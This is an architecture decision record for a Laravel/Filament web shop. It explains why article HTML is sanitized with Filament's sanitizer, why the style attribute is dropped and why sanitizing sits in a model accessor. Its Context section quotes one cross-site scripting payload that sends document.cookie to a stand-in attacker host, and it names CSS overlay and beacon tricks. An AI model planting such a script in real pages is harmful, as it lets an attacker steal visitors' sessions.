# ADR-0015: How author-written HTML is sanitized

Status: Accepted
Date: 2026-08-29 · Deciders: Aleksandar Stanchev

## Context

`ArticleForm` edits `articles.content` with Filament's `RichEditor`, which
saves HTML. The journal renders that HTML on a public page, so it has to be
rendered unescaped — `{{ }}` would show the tags as text — and unescaped
author HTML is the textbook cross-site scripting hole. An editor account that
is compromised, or a content editor acting badly, can save
`<script>fetch('//attacker/?c='+document.cookie)</script>` and collect a
session cookie from every visitor.

CLAUDE.md has stated the requirement since before the storefront existed:
*"Article and review bodies are user input. Purify before rendering;
`{!! !!}` escapes nothing."* Nothing had implemented it, because until the
journal there was no public page rendering a body.

Two tools were available. `stevebauman/purify`, a wrapper around
HTMLPurifier, arrived with the initial project skeleton in `5e56992` and had
never been configured or called. Filament 4 ships `sanitizeHtml()`, a
`Stringable` macro over Symfony's `HtmlSanitizer`, and its own documentation
names it as the tool to use when rendering `RichEditor` output in a hand-
written Blade view.

## Decision

**Author HTML is sanitized with Filament's `sanitizeHtml()`, and
`stevebauman/purify` is removed from the project.**

**The `style` attribute is dropped globally.** `AppServiceProvider::register()`
extends the container's `HtmlSanitizerConfig` with
`->dropAttribute('style', '*')`.

**Sanitizing happens in one place per model, not in templates.**
`Article::$safe_content` is an accessor returning an `HtmlString`; the journal
renders `{{ $article->safe_content }}`.

### Why Filament's sanitizer rather than HTMLPurifier

HTMLPurifier is the stricter of the two out of the box, and that is a real
advantage rather than a marketing one. It parses the CSS inside a `style`
attribute and allows individual properties — its default
`CSS.AllowedProperties` omits `position` entirely and permits
`background-color` but not the `background` shorthand, so the two attacks
Filament documents against itself, a `position: fixed` phishing overlay and a
`background: url(...)` beacon, are both blocked by HTMLPurifier without any
configuration. Symfony's sanitizer does not read CSS at all; it passes the
attribute through whole or not at all.

That advantage disappears the moment the attribute is dropped, which is one
line, and the rest of the comparison then favours Filament's.

The deciding factor is `RichEditor`'s own markup. It emits `data-color`,
`data-cols`, `data-col-span`, `data-from-breakpoint`, `data-id` and
`data-type` for text colours, grid layouts, merge tags and custom blocks, and
Filament's sanitizer allowlists each by name. HTMLPurifier's default
`HTML.Allowed` permits no `data-*` attribute, no `class`, no `<table>` and no
`<pre>`. Sanitizing `RichEditor` output through it strips the editor's own
structure, and the failure is silent: the article renders correctly in the
panel's preview and wrongly on the storefront, with nothing in any log.

Making HTMLPurifier work would mean hand-writing an allowlist enumerating
another package's internal attribute names and keeping it correct across
Filament upgrades. That coupling is worse than the problem it solves.

Two further reasons, both smaller. The panel already sanitizes article
content with this exact tool when a `TextColumn` or `TextEntry` renders it,
so using it on the storefront gives the project one definition of "safe"
rather than two that can disagree. And it needs no configuration file, no
`vendor:publish`, and no dependency.

### Why the `style` attribute is dropped rather than filtered

Filament allows `style` deliberately, so that its editor's text colours,
highlighting and image sizing survive. Its documentation states the
consequence plainly: the sanitizer "allows the `style` attribute through
without parsing the CSS inside it", so `position: fixed` and
`background: url(...)` are not stripped, and it advises restricting the
default where content is not fully trusted.

Verified against the running container before deciding. With the default
configuration, `<script>` is removed and a `javascript:` href is stripped,
but `<p style="position:fixed;inset:0">` survives intact. With
`dropAttribute('style', '*')`, both that and `background: url(...)` are gone
while `<p>` and `<strong>` are untouched.

The cost is text colour and highlighting in articles. It is not a real cost
here: neither `textColor` nor `highlight` is in `RichEditor`'s default
toolbar, so nothing in `ArticleForm` can currently produce inline style at
all. Everything else an author uses was confirmed to survive — `h2`, `h3`,
`strong`, `em`, `u`, `s`, both list types, `blockquote`, `pre`/`code`, links
with `href` and `title`, images with `alt`, `width` and `height`, tables, and
`class`.

`HtmlSanitizerConfig` is a container binding, so extending it changes the
panel as well as the storefront. That is deliberate. A rule that holds in one
half of the application and not the other is the shape of bug this project
has already paid for once, in the discount window that `ProductList` and
`ResolveVariationPrice` each implemented separately.

### Why an accessor rather than sanitizing in the template

A body will be rendered in more than one place before this project ends — the
article page, a preview, a feed, a related-articles excerpt. Sanitizing in
Blade means every one of those has to remember, and the one that forgets
fails silently and looks fine.

`Article::$safe_content` returns an `HtmlString`, which Blade renders without
escaping. The template therefore contains no `{!! !!}` at all: the dangerous
operation is named, lives in the model, and carries the docblock explaining
why. A template reaching for `content` directly is then visibly wrong rather
than indistinguishable from correct code.

## Consequences

- Article authors lose coloured and highlighted text. No toolbar button
  currently produces either, so nothing changes until someone adds one — and
  adding one would silently produce markup this ADR strips.
- The panel's `TextColumn`/`TextEntry` rendering of article content also
  loses inline styles, because the binding is global.
- The storefront's XSS protection now depends on a Filament package. If
  Filament is ever removed, `sanitizeHtml()` goes with it and every rendered
  body becomes unsafe. Whoever removes Filament owns replacing this; the
  accessor is the single place that would need changing.
- `stevebauman/purify` is gone from `composer.json`, `composer.lock` and
  `vendor/`. Reintroducing it is a new decision, not a revert.
- The rule is only as good as its wiring, which static analysis cannot check
  — a template rendering `content` instead of `safe_content` type-checks
  perfectly. The accessor's test is what pins it.

## Alternatives rejected

- **HTMLPurifier via `stevebauman/purify`.** Stricter by default on CSS,
  which stops mattering once `style` is dropped, and its default allowlist
  strips `RichEditor`'s own attributes. Covered above.
- **Both, with Purify as a second pass on the storefront.** Genuine defence
  in depth, and the honest answer if article content ever came from the
  public rather than from staff. Rejected for now: two sanitizers means two
  allowlists to keep correct, for a threat model — a compromised
  `content_editor` account — that either one already covers.
- **Filtering CSS properties instead of dropping `style`.** Symfony's
  sanitizer has no CSS parser, so this would mean writing one or bringing
  HTMLPurifier back for that single attribute.
- **Sanitizing on write, in `ArticleForm`.** Cheaper per render, and wrong:
  it protects only the rows written after the change, leaves the existing 24
  articles unsanitized, and silently destroys an author's markup at save time
  where they cannot see what was removed. Sanitizing on read means the stored
  content stays exactly what the author wrote.
- **Escaping with `{{ }}` and accepting plain text.** All 24 seeded articles
  are currently plain text, so this would work today and break the first time
  anyone uses the editor's bold button.
